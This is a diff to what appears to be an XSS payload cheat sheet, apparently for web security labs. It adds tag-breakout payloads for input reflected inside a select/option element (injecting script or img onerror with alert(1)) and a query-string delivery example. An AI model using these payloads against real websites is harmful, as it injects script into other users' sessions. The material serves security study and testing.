@@ -94,6 +94,17 @@ Input lands inside an existing HTML tag (e.g. `<img src="YOUR_INPUT">`):
 " onmouseover="alert(1)
 ```
 
+Input lands inside a `<select>` element (e.g. `<option selected>YOUR_INPUT</option>`):
+```
+# Close option + close select + inject
+</option></select><script>alert(1)</script>
+</option></select><img src=x onerror=alert(1)>
+```
+Source is typically `location.search` via URL — no Burp needed:
+```
+?productId=1&storeId=</option></select><script>alert(1)</script>
+```
+
 ### innerHTML sink
 ```
 # script tags don't execute via innerHTML — use event handlers
